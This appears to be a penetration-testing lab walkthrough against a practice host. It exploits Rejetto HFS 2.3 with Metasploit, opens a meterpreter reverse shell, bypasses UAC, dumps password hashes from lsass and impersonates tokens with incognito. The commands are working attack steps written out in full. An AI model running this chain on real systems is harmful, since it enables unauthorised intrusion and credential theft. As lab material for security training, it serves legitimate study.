
```bash
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/e168854491412d443ed4316e2e9ec9764c5fba0fb0a8014d03c0cd4663a64e25.jpg)

The target is reachable.

**Step 3:** Check open ports on the target machine:

**Command:**

```bash
nmap demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/30f515d5514e8518fb28c07f0ec66afdba6bb289c84c993bafa092c07ed8f444.jpg)

**Step 4:** We have discovered that multiple ports are open. We will run Nmap again to determine version information on port 80.

**Command:**

```bash
nmap -sV -p 80 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/b11cad74e750ee448e82898ce1c8b660c2d33482d0a10286ed83743b54ef99c4.jpg)

HTTP File Server (HFS) 2.3 is available.

**Step 5:** We will search for an exploit for hfs file server using searchsploit.

**Command:**

```
searchsploit hfs
```

![Content Image](https://assets.ine.com/lab/learningpath/d96a1b428650e18e7c45baf3d777a06cc6b3c0d990cbc640aee391d8694a01ed.jpg)

**Step 6:** : Rejetto HTTP File Server (HFS) 2.3 is vulnerable to RCE. Exploiting the target server using the Metasploit framework.

**Commands:**

```bash
msfconsole -q

use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/b62b39bff1b1d45e41cce58d385671116fd42c142e094919ed00b33859c96387.jpg)

We have successfully exploited the target vulnerable application (hfs) and received a meterpreter shell.

**Step 7:** Checking the current user.

**Commands:**

```bash
getuid
sysinfo
```

![Content Image](https://assets.ine.com/lab/learningpath/20571d67cbc382f2e831cf0c74c14d1496617f7acfc401acec0d5e263b8c5209.jpg)

**Step 8:** We can observe that we are running as an admin user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process to the explorer process.

**Commands:**

```bash
ps -S explorer.exe
migrate 2124
```

**Please note** the explorer.exe arch is **x64** bit, so later when we perform UAC bypass, we have to use x64 based meterpreter payload.

![Content Image](https://assets.ine.com/lab/learningpath/277cc6e33ce8bf27515e05ad72d003d8aab11698849819d2bdce667ea960329f.jpg)

Found the privileges have our user
```
getprivs 
```

**Step 9:** Elevate to the high privilege:

**Command**:
```
getsystem
```

![Content Image](https://assets.ine.com/lab/learningpath/9564463e514178f86159f84bb69ea2f4e987ad3bdcd965985089604eff52388f.jpg)

We can observe that we do not have permission to elevate privileges.

Find users on the system
```
net users 
```

**Step 10:** Get a windows shell and check if the admin user is a member of the Administrators group.

**Commands:**
```
shell
net localgroup administrators
```

![Content Image](https://assets.ine.com/lab/learningpath/5589520c742892e2243ad8d4758b13449a30ebb6fdc0ac4062102e71f18874de.jpg)

The admin user is a member of the Administrators group. However, we do not have the high privilege as of now. We can gain high privilege by Bypassing UAC (User Account Control).

We are going to bypass UAC using the Metasploit local exploit module.

“This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.”

**Source:** [https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_injection/]

**Step 11:** Background the current session and use the local exploit for UAC bypass.

**Commands:**

```bash
CTRL + C
background
```

![Content Image](https://assets.ine.com/lab/learningpath/ca5b416a8e9487c368863c2217f60cb54602fa148596abaee2b961073466245c.jpg)

**Step 12:** Run UAC Bypass In-Memory Injection module.

**Commands:**

```bash
use exploit/windows/local/bypassuac_injection
set session 1
set TARGET Windows\ x64
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

![Content Image](https://assets.ine.com/lab/learningpath/3bd251ab333e7bc76b89c6efd1f6604a92de4448327aa512a95450315710125f.jpg)

**Step 13:** Elevate to the high privilege.

**Commands:**

```bash
getsystem
getuid
```

![Content Image](https://assets.ine.com/lab/learningpath/c2382394ab4a3fcf21e9b0e946b492ebf8b7f90bc868bda218638624c476e788.jpg)

We have successfully gained high privilege access. Dump the user hashes.

**Step 14:** Migrate in lsass.exe process.

**Commands:**

```bash
ps -S lsass.exe
migrate 484
```

![Content Image](https://assets.ine.com/lab/learningpath/ee0458747473d3189af918aef38ab43dd7a9c050dc391747a3f4c88e85ae2f58.jpg)

**Step 15:** Dump the hashes.

**Command:**

```bash
hashdump
```

![Content Image](https://assets.ine.com/lab/learningpath/fcbaefdd69e334d89401b92283313536258daa1bb245c6af2ffd7466594d4146.jpg)

This reveals the flag to us.


### Token impersonation using icognito

`load incognito` this is a Metasploit-Spoliate module name, use for Impersonate the Token
```bash
load incognito
```

Now list all the user tokens,
there are two types of tokens but we need the user token only
```bash
list_tokens -u
```

Now time to impersonate the user token, for do that user the billow command
Delegation Token is created by direct authentication method like (RDP, SSH)
```bash
impersonate_token <Delegation_Token>
Ex: impersonate_token "<ATTACKDEFENSE\\administrator>"
```

